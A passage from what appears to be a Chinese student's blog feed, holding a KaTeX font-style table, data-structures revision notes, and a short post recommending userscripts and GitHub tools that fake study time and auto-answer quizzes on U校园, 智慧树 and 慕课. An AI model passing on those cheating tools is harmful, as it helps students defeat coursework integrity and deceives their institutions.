mathvariant="sans-serif">o</mi><mi mathvariant="sans-serif">p</mi><mi mathvariant="sans-serif">q</mi><mi mathvariant="sans-serif">r</mi><mi mathvariant="sans-serif">s</mi><mi mathvariant="sans-serif">t</mi><mi mathvariant="sans-serif">u</mi><mi mathvariant="sans-serif">v</mi><mi mathvariant="sans-serif">w</mi><mi mathvariant="sans-serif">x</mi><mi mathvariant="sans-serif">y</mi><mi mathvariant="sans-serif">z</mi></mrow><annotation encoding="application/x-tex">\mathsf{nopqrstuvwxyz}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76587em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathsf">n</span><span class="mord mathsf">o</span><span class="mord mathsf">p</span><span class="mord mathsf">q</span><span class="mord mathsf" style="margin-right:0.01389em;">r</span><span class="mord mathsf">s</span><span class="mord mathsf">t</span><span class="mord mathsf">u</span><span class="mord mathsf" style="margin-right:0.01389em;">v</span><span class="mord mathsf" style="margin-right:0.01389em;">w</span><span class="mord mathsf">x</span><span class="mord mathsf" style="margin-right:0.01389em;">y</span><span class="mord mathsf">z</span></span></span></span></span></td><td style="text-align:left">\mathsf{nopqrstuvwxyz}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn mathvariant="sans-serif">0123456789</mn></mrow><annotation encoding="application/x-tex">\mathsf{0123456789}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65556em;vertical-align:0em;"></span><span class="mord"><span class="mord mathsf">0</span><span class="mord mathsf">1</span><span class="mord mathsf">2</span><span class="mord mathsf">3</span><span class="mord mathsf">4</span><span class="mord mathsf">5</span><span class="mord mathsf">6</span><span class="mord mathsf">7</span><span class="mord mathsf">8</span><span class="mord mathsf">9</span></span></span></span></span></td><td style="text-align:left">\mathsf{0123456789}</td></tr><tr><td style="text-align:left">手写体 Calligraphy/花体 script</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">A</mi><mi mathvariant="script">B</mi><mi mathvariant="script">C</mi><mi mathvariant="script">D</mi><mi mathvariant="script">E</mi><mi mathvariant="script">F</mi><mi mathvariant="script">G</mi><mi mathvariant="script">H</mi><mi mathvariant="script">I</mi></mrow><annotation encoding="application/x-tex">\mathcal{ABCDEFGHI}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78055em;vertical-align:-0.09722em;"></span><span class="mord"><span class="mord mathcal">A</span><span class="mord mathcal" style="margin-right:0.03041em;">B</span><span class="mord mathcal" style="margin-right:0.05834em;">C</span><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="mord mathcal" style="margin-right:0.08944em;">E</span><span class="mord mathcal" style="margin-right:0.09931em;">F</span><span class="mord mathcal" style="margin-right:0.0593em;">G</span><span class="mord mathcal" style="margin-right:0.00965em;">H</span><span class="mord mathcal" style="margin-right:0.07382em;">I</span></span></span></span></span></td><td style="text-align:left">\mathcal{ABCDEFGHI}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">J</mi><mi mathvariant="script">K</mi><mi mathvariant="script">L</mi><mi mathvariant="script">M</mi><mi mathvariant="script">N</mi><mi mathvariant="script">O</mi><mi mathvariant="script">P</mi><mi mathvariant="script">Q</mi><mi mathvariant="script">R</mi></mrow><annotation encoding="application/x-tex">\mathcal{JKLMNOPQR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78055em;vertical-align:-0.09722em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span><span class="mord mathcal" style="margin-right:0.01445em;">K</span><span class="mord mathcal">L</span><span class="mord mathcal">M</span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mord mathcal" style="margin-right:0.02778em;">O</span><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="mord mathcal">Q</span><span class="mord mathcal">R</span></span></span></span></span></td><td style="text-align:left">\mathcal{JKLMNOPQR}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">S</mi><mi mathvariant="script">T</mi><mi mathvariant="script">U</mi><mi mathvariant="script">V</mi><mi mathvariant="script">W</mi><mi mathvariant="script">X</mi><mi mathvariant="script">Y</mi><mi mathvariant="script">Z</mi></mrow><annotation encoding="application/x-tex">\mathcal{STUVWXYZ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78055em;vertical-align:-0.09722em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.075em;">S</span><span class="mord mathcal" style="margin-right:0.25417em;">T</span><span class="mord mathcal" style="margin-right:0.09931em;">U</span><span class="mord mathcal" style="margin-right:0.08222em;">V</span><span class="mord mathcal" style="margin-right:0.08222em;">W</span><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="mord mathcal" style="margin-right:0.07944em;">Z</span></span></span></span></span></td><td style="text-align:left">\mathcal{STUVWXYZ}</td></tr><tr><td style="text-align:left">德文尖角体 Fraktur typeface</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="fraktur">A</mi><mi mathvariant="fraktur">B</mi><mi mathvariant="fraktur">C</mi><mi mathvariant="fraktur">D</mi><mi mathvariant="fraktur">E</mi><mi mathvariant="fraktur">F</mi><mi mathvariant="fraktur">G</mi><mi mathvariant="fraktur">H</mi><mi mathvariant="fraktur">I</mi></mrow><annotation encoding="application/x-tex">\mathfrak{ABCDEFGHI}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.81745em;vertical-align:-0.12604em;"></span><span class="mord"><span class="mord mathfrak">A</span><span class="mord mathfrak">B</span><span class="mord mathfrak">C</span><span class="mord mathfrak">D</span><span class="mord mathfrak">E</span><span class="mord mathfrak">F</span><span class="mord mathfrak">G</span><span class="mord mathfrak">H</span><span class="mord mathfrak">I</span></span></span></span></span></td><td style="text-align:left">\mathfrak{ABCDEFGHI}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="fraktur">J</mi><mi mathvariant="fraktur">K</mi><mi mathvariant="fraktur">L</mi><mi mathvariant="fraktur">M</mi><mi mathvariant="fraktur">N</mi><mi mathvariant="fraktur">O</mi><mi mathvariant="fraktur">P</mi><mi mathvariant="fraktur">Q</mi><mi mathvariant="fraktur">R</mi></mrow><annotation encoding="application/x-tex">\mathfrak{JKLMNOPQR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.88047em;vertical-align:-0.18906em;"></span><span class="mord"><span class="mord mathfrak">J</span><span class="mord mathfrak">K</span><span class="mord mathfrak">L</span><span class="mord mathfrak">M</span><span class="mord mathfrak">N</span><span class="mord mathfrak">O</span><span class="mord mathfrak">P</span><span class="mord mathfrak">Q</span><span class="mord mathfrak">R</span></span></span></span></span></td><td style="text-align:left">\mathfrak{JKLMNOPQR}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="fraktur">S</mi><mi mathvariant="fraktur">T</mi><mi mathvariant="fraktur">U</mi><mi mathvariant="fraktur">V</mi><mi mathvariant="fraktur">W</mi><mi mathvariant="fraktur">X</mi><mi mathvariant="fraktur">Y</mi><mi mathvariant="fraktur">Z</mi></mrow><annotation encoding="application/x-tex">\mathfrak{STUVWXYZ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.88047em;vertical-align:-0.18906em;"></span><span class="mord"><span class="mord mathfrak">S</span><span class="mord mathfrak">T</span><span class="mord mathfrak">U</span><span class="mord mathfrak">V</span><span class="mord mathfrak">W</span><span class="mord mathfrak">X</span><span class="mord mathfrak">Y</span><span class="mord mathfrak">Z</span></span></span></span></span></td><td style="text-align:left">\mathfrak{STUVWXYZ}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="fraktur">a</mi><mi mathvariant="fraktur">b</mi><mi mathvariant="fraktur">c</mi><mi mathvariant="fraktur">d</mi><mi mathvariant="fraktur">e</mi><mi mathvariant="fraktur">f</mi><mi mathvariant="fraktur">g</mi><mi mathvariant="fraktur">h</mi><mi mathvariant="fraktur">i</mi><mi mathvariant="fraktur">j</mi><mi mathvariant="fraktur">k</mi><mi mathvariant="fraktur">l</mi><mi mathvariant="fraktur">m</mi></mrow><annotation encoding="application/x-tex">\mathfrak{abcdefghijklm}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.88047em;vertical-align:-0.18906em;"></span><span class="mord"><span class="mord mathfrak">a</span><span class="mord mathfrak">b</span><span class="mord mathfrak">c</span><span class="mord mathfrak">d</span><span class="mord mathfrak">e</span><span class="mord mathfrak">f</span><span class="mord mathfrak">g</span><span class="mord mathfrak">h</span><span class="mord mathfrak">i</span><span class="mord mathfrak">j</span><span class="mord mathfrak">k</span><span class="mord mathfrak">l</span><span class="mord mathfrak">m</span></span></span></span></span></td><td style="text-align:left">\mathfrak{abcdefghijklm}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="fraktur">n</mi><mi mathvariant="fraktur">o</mi><mi mathvariant="fraktur">p</mi><mi mathvariant="fraktur">q</mi><mi mathvariant="fraktur">r</mi><mi mathvariant="fraktur">s</mi><mi mathvariant="fraktur">t</mi><mi mathvariant="fraktur">u</mi><mi mathvariant="fraktur">v</mi><mi mathvariant="fraktur">w</mi><mi mathvariant="fraktur">x</mi><mi mathvariant="fraktur">y</mi><mi mathvariant="fraktur">z</mi></mrow><annotation encoding="application/x-tex">\mathfrak{nopqrstuvwxyz}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.81025em;vertical-align:-0.18906em;"></span><span class="mord"><span class="mord mathfrak">n</span><span class="mord mathfrak">o</span><span class="mord mathfrak">p</span><span class="mord mathfrak">q</span><span class="mord mathfrak">r</span><span class="mord mathfrak">s</span><span class="mord mathfrak">t</span><span class="mord mathfrak">u</span><span class="mord mathfrak">v</span><span class="mord mathfrak">w</span><span class="mord mathfrak">x</span><span class="mord mathfrak">y</span><span class="mord mathfrak">z</span></span></span></span></span></td><td style="text-align:left">\mathfrak{nopqrstuvwxyz}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn mathvariant="fraktur">0123456789</mn></mrow><annotation encoding="application/x-tex">\mathfrak{0123456789}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.88047em;vertical-align:-0.18906em;"></span><span class="mord"><span class="mord mathfrak">0</span><span class="mord mathfrak">1</span><span class="mord mathfrak">2</span><span class="mord mathfrak">3</span><span class="mord mathfrak">4</span><span class="mord mathfrak">5</span><span class="mord mathfrak">6</span><span class="mord mathfrak">7</span><span class="mord mathfrak">8</span><span class="mord mathfrak">9</span></span></span></span></span></td><td style="text-align:left">\mathfrak{0123456789}</td></tr><tr><td style="text-align:left">小型手写体 Small scriptstyle text</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="1" displaystyle="false"><mtext>abcdefghijklm</mtext></mstyle></mrow><annotation encoding="application/x-tex">{\scriptstyle\text{abcdefghijklm}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6222159999999999em;vertical-align:-0.13610799999999998em;"></span><span class="mord"><span class="mord text mtight sizing reset-size6 size3"><span class="mord mtight">abcdefghijklm</span></span></span></span></span></span></td><td style="text-align:left">{\scriptstyle\text{abcdefghijklm}}</td></tr></tbody></table><h1 id="3-关于-about"><a class="markdownIt-Anchor" href="#3-关于-about"></a> 3 关于 About</h1><p>如有任何问题可以点击页面下方的邮箱图标向我们反馈，感谢您的使用！</p><h1 id="4-参考文献-reference"><a class="markdownIt-Anchor" href="#4-参考文献-reference"></a> 4 参考文献 Reference</h1><p><a href="http://47.104.179.138/">1. LaTeX公式编辑器</a><br /><a href="https://docs.mathjax.org/en/latest/index.html">2. MathJax Documentation</a><br /><a href="https://en.wikipedia.org/wiki/Help:Displaying_a_formula">3. Displaying a formula</a><br /><a href="https://github.com/mathjax/MathJax">4. mathjax/MathJax: Beautiful math in all browsers - GitHub</a><br /><a href="https://mhchem.github.io/MathJax-mhchem/">5. mhchem for MathJax</a></p>]]></content>
      
      
      <categories>
          
          <category> 手册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手册 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>期末周刷课指南</title>
      <link href="/2024/05/27/%E6%9C%9F%E6%9C%AB%E5%91%A8%E5%88%B7%E8%AF%BE%E6%8C%87%E5%8D%97/"/>
      <url>/2024/05/27/%E6%9C%9F%E6%9C%AB%E5%91%A8%E5%88%B7%E8%AF%BE%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>记录一下目前我自己在用的刷课脚本(适用大一下学期)</p><p>前置:<mark>浏览器安装油猴/暴力猴等脚本管理拓展</mark></p><h1 id="u校园"><a class="markdownIt-Anchor" href="#u校园"></a> U校园</h1><p>刷时长：<a href="https://greasyfork.org/zh-CN/scripts/406339-u%E6%A0%A1%E5%9B%AD%E5%A2%9E%E5%8A%A0%E6%97%B6%E9%95%BF-%E4%BF%AE%E5%A4%8D%E5%BF%85%E4%BF%AE%E5%BC%B9%E7%AA%97">U校园增加时长（修复必修弹窗） (greasyfork.org)</a></p><p>答题：（手动)<a href="https://www.xiaohongshu.com/explore/642fcd970000000012032315">新视野大学英语2第三版思政智慧版u校园答案 - 小红书 (xiaohongshu.com)</a></p><p>如果你是富哥可以使用自动答题</p><p>[FCQ网课通助手<a href="https://greasyfork.org/zh-CN/scripts/477942-fcq%E7%BD%91%E8%AF%BE%E9%80%9A%E5%8A%A9%E6%89%8B-%E5%85%A8%E7%BD%91%E9%A2%98%E5%BA%93-%E9%80%9A%E7%94%A8%E6%99%BA%E8%83%BD%E9%80%82%E9%85%8D%E7%AD%94%E9%A2%98-%E5%88%B7%E8%AF%BE">全网题库][通用智能适配答题][刷课] (greasyfork.org)</a></p><p>(需要付费)</p><p>可以盯一下这个项目(github上找的):</p><p><a href="https://github.com/CXRunfree/AutoUnipus">CXRunfree/AutoUnipus: U校园脚本,支持全自动答题,百分百正确 2024最新版 (github.com)</a></p><p>教材的题型是不支持的，看作者后续是否更新</p><h1 id="智慧树"><a class="markdownIt-Anchor" href="#智慧树"></a> 智慧树</h1><p>自动刷课:<a href="https://github.com/CXRunfree/Autovisor">CXRunfree/Autovisor: 2024知道智慧树刷课脚本 基于Python Playwright的自动化程序(github.com)</a></p><p>自动答题: [FCQ网课通助手<a href="https://greasyfork.org/zh-CN/scripts/477942-fcq%E7%BD%91%E8%AF%BE%E9%80%9A%E5%8A%A9%E6%89%8B-%E5%85%A8%E7%BD%91%E9%A2%98%E5%BA%93-%E9%80%9A%E7%94%A8%E6%99%BA%E8%83%BD%E9%80%82%E9%85%8D%E7%AD%94%E9%A2%98-%E5%88%B7%E8%AF%BE">全网题库][通用智能适配答题][刷课] (greasyfork.org)</a></p><h1 id="慕课"><a class="markdownIt-Anchor" href="#慕课"></a> 慕课</h1><p><a href="https://domooc.top/domoocinstall">https://domooc.top/domoocinstall</a></p><p>[FCQ网课通助手<a href="https://greasyfork.org/zh-CN/scripts/477942-fcq%E7%BD%91%E8%AF%BE%E9%80%9A%E5%8A%A9%E6%89%8B-%E5%85%A8%E7%BD%91%E9%A2%98%E5%BA%93-%E9%80%9A%E7%94%A8%E6%99%BA%E8%83%BD%E9%80%82%E9%85%8D%E7%AD%94%E9%A2%98-%E5%88%B7%E8%AF%BE">全网题库][通用智能适配答题][刷课] (greasyfork.org)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构复习笔记</title>
      <link href="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="about"><a class="markdownIt-Anchor" href="#about"></a> About</h2><p>此文是我在期末复习(<s>预习</s>🤣)数据结构（严蔚敏版）期间，对各章节重难点的梳理</p><p><s>为了应付考试</s>，时间紧迫，理解算法的基本思想，会做题就行。。</p><p><em>如果时间充足，我认为数据结构这本书上的各种算法都需要自己实现一遍(即便你理解了算法思想，但是如果不实现的话，一些编程思想就无法理解，写代码就会想半天)，才能打下坚实的代码基础，不能老是纸上谈兵</em></p><p><a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/tree/master/C">DataStructuresAndAlgorithms/C at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a>这是我参考资料用代码实现了的一部分重要的算法</p><h2 id="chap2-线性表"><a class="markdownIt-Anchor" href="#chap2-线性表"></a> Chap2 线性表</h2><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605155422034.png" class="" alt="image-20240605155422034" loading="lazy"><h3 id="单链表"><a class="markdownIt-Anchor" href="#单链表"></a> 单链表</h3><h4 id="类型"><a class="markdownIt-Anchor" href="#类型"></a> 类型</h4><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605161035229.png" class="" alt="image-20240605161035229" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605161055498.png" class="" alt="image-20240605161055498" loading="lazy"><hr /><h4 id="单链表的建立"><a class="markdownIt-Anchor" href="#单链表的建立"></a> 单链表的建立</h4><h5 id="生成带头结点的单链表"><a class="markdownIt-Anchor" href="#生成带头结点的单链表"></a> 生成带头结点的单链表</h5><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605161752353.png" class="" alt="image-20240605161752353" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605161820695.png" class="" alt="image-20240605161820695" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605162100451.png" class="" alt="image-20240605162100451" loading="lazy"><h4 id="生成无表头结点的单链表"><a class="markdownIt-Anchor" href="#生成无表头结点的单链表"></a> 生成无表头结点的单链表</h4><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605162905605.png" class="" alt="image-20240605162905605" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605162919028.png" class="" alt="image-20240605162919028" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605162954647.png" class="" alt="image-20240605162954647" loading="lazy"><h4 id="单链表的插入"><a class="markdownIt-Anchor" href="#单链表的插入"></a> 单链表的插入</h4><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605162711908.png" class="" alt="image-20240605162711908" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605162724091.png" class="" alt="image-20240605162724091" loading="lazy"><h3 id="循环链表"><a class="markdownIt-Anchor" href="#循环链表"></a> 循环链表</h3><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605155628027.png" class="" alt="image-20240605155628027" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605155654656.png" class="" alt="image-20240605155654656" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240605160326114.png" class="" alt="image-20240605160326114" loading="lazy"><h2 id="chap6-树和二叉树"><a class="markdownIt-Anchor" href="#chap6-树和二叉树"></a> Chap6 树和二叉树</h2><h3 id="树的定义和基本术语"><a class="markdownIt-Anchor" href="#树的定义和基本术语"></a> 树的定义和基本术语</h3><h4 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h4><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604113030555.png" class="" alt="image-20240604113030555" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604115100811.png" class="" alt="image-20240604115100811" loading="lazy"><p>一个节点的树T={A}</p><p>四个节点的树T={A,B,C,D},T1={B} T2={C} T3={D}</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604115646298.png" class="" alt="image-20240604115646298" loading="lazy"><h4 id="术语"><a class="markdownIt-Anchor" href="#术语"></a> 术语</h4><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604114022629.png" class="" alt="image-20240604114022629" loading="lazy"><ul><li><p>A,B,E是K的<strong>祖先</strong>（根节点到该节点唯一路径上的任意节点)；</p></li><li><p>E是K的<strong>双亲</strong>，K是E的<strong>孩子</strong>,K,L为兄弟,K,M为堂兄弟</p></li><li><p>节点的度：节点的孩子个数</p></li><li><p>树的度:树中节点最大的度数</p></li><li><p><strong>分支节点</strong>:度&gt;0;叶子节点:度=0</p></li><li><p>结点的深度、高度和层次。<br />结点的层次从树根开始定义,根结点为第1层,它的子结点为第2层,以此类推。双亲在同一层的结点互为堂兄弟,图中结点G与E,F,H,I,J互为堂兄弟。<br /><strong>结点的深度是从根结点开始自顶向下逐层累加的。</strong><br /><strong>结点的高度是从叶结点开始自底向上逐层累加的。</strong><br />树的高度(或深度)是树中结点的最大层数。图中树的高度为4。</p></li><li><p>有序树和无序树。树中结点的各子树从左到右是有次序的,不能互换,称该树为<strong>有序树</strong>,否则称为<strong>无序树</strong>。假设图为有序树,若将子结点位置互换,则变成一棵不同的树。</p></li><li><p>路径和路径长度。树中两个结点之间的<strong>路径</strong>是由这两个结点之间所经过的结点序列构成的,而<strong>路径长度</strong>是路径上所经过的边的个数。</p></li><li><p>森林。<strong>森林</strong>是m (m≥0)棵互不相交的树的集合。森林的概念与树的概念十分相近，因为只要把树的根结点删去就成了森林。反之，只要给m棵独立的树加上一个结点，并把这m棵树作为该结点的子树，则森林就变成了树。</p><p>森林F={T1,T2,T3}</p></li></ul><h4 id="性质"><a class="markdownIt-Anchor" href="#性质"></a> <mark>性质</mark></h4><ol><li>树中的节点数=所有结点度数+1（根节点）</li><li>度为m的树中至多有m<sup>i-1</sup>个节点</li><li>高度为h的m叉树至多有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><msup><mi>m</mi><mi>h</mi></msup><mo>−</mo><mn>1</mn></mrow><mrow><mi>m</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{m^h-1}{m-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4462509999999997em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0429199999999998em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9270285714285713em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个节点，（等比数列求和公式)</li><li>具有n个节点的m叉树的最小高度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>m</mi></msub><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[log_m{n(m-1)+1}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span><span class="mclose">]</span></span></span></span>,(由3求解h得到)</li></ol><h3 id="存储结构"><a class="markdownIt-Anchor" href="#存储结构"></a> 存储结构</h3><ul><li><p>双亲表示法/数组表示法/顺序表示法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">snode</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> data<span class="token punctuation">;</span>    <span class="token keyword">int</span> parent<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>t<span class="token punctuation">[</span>maxlength<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例如<img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604120313285.png" class="" alt="image-20240604120313285" loading="lazy"></p></li><li><p>孩子表示法/链接表表示法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> data<span class="token punctuation">;</span>    node<span class="token operator">*</span> child1<span class="token punctuation">;</span>    node<span class="token operator">*</span> child2<span class="token punctuation">;</span>    node<span class="token operator">*</span> child3<span class="token 